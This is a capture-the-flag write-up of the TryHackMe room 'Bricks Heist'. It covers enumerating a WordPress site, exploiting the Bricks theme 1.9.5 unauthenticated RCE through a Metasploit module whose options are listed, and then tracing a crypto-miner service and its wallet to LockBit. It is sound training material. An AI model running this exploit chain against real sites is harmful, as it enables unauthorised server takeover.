---
title: 'TryHackMe: TryHack3M: Bricks Heist'
author: AmcaQt
categories: [TryHackMe]
tags: [web, enumeration, rce]
render_with_liquid: false
media_subpath: /images/thm_bricks_heist/
image:
  path: room_card.png
---

![Tryhackme Room Link](room_image.PNG){: width="600" height="150" .shadow }
_<https://tryhackme.com/r/room/tryhack3mbricksheist>_

## Description

Brick Press Media Co. was working on creating a brand-new web theme that represents a renowned wall using three million byte bricks. Agent Murphy comes with a streak of bad luck. And here we go again: the server is compromised, and they've lost access.

Can you hack back the server and identify what happened there?

Note : Add `MACHINE_IP bricks.thm` to your /etc/hosts file.

## Question & Flag

### What is the content of the hidden .txt file in the web folder?

First, before do further enumaration, let's run the basic scan with nmap

![Nmap Scan](scan.PNG)

Interesting find here, without wasting any time let's look further with [**WpScan**](https://www.kali.org/tools/wpscan/)

![](2.PNG)

The scan shows the site using Theme `bricks` with version `1.9.5`, after some research and finding we found the version is Vuln to Unauthenticated RCE

![Remote Code Execution](3.PNG)

The exploit and cve for the version is on github but i want to use metasploit to speed up the exploit
> https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT

Power up your msfconsole and search for bricks, you shall find the matching modules

![](4.PNG)

simply use command use 0 and fill in the require and you shall get the shell

![](5.PNG)

```Command
set LHOST 10.8.58.21
set RHOSTS https://bricks.thm
set RPORT 443
run
```

with that you may find the answer for Task 1

![](6.jpg)

### What is the name of the suspicious process? & What is the service name affiliated with the suspicious process?

For this one go to google and do some research about it , then you'll found the command

![](systemctl.PNG)

get back to the terminal and try out the command

![](7.PNG)

but this is not the answer, let's try view the content of the service

![](8.jpg)

That's what we want

### What is the log file name of the miner instance?

Notice that the service is executing from `/lib/NetworkManager/` directory, go to that directory

![](9.jpg)

### What is the wallet address of the miner instance? & The wallet address used has been involved in transactions between wallets belonging to which threat group?

Using the strings on the log file that we view earlier, try to decode with [**CyberChef**](https://gchq.github.io/CyberChef/)

![](10.PNG)

kinda lost on what that is, but since we searched about wallet address so i did some research

![](wallet.PNG)

so i need to confirm it, go to [**Blockchair**](https://blockchair.com/) , lucky it was the correct one, so i went down to the last payment received

![](11.PNG)

Inside that transaction history and from there, inside the privacy check

![](12.PNG)

We can see the details on the transaction

![](13.PNG)

Copy the sender address and search it on google, most of the result return `LockBit`

> Source :
> 
> https://ofac.treasury.gov/recent-actions/20240220
>
> https://www.chainalysis.com/blog/lockbit-takedown-sanctions-february-2024/

## Conclusion 

This was fun Room and good for beginner to learn about `CVE` and how risky Outdated version of CMS such as `WordPress`.

# Happy Hacking

![Cute Gif](https://i.pinimg.com/originals/c6/ad/84/c6ad8481cee4f75d464b2a14040d06c9.gif)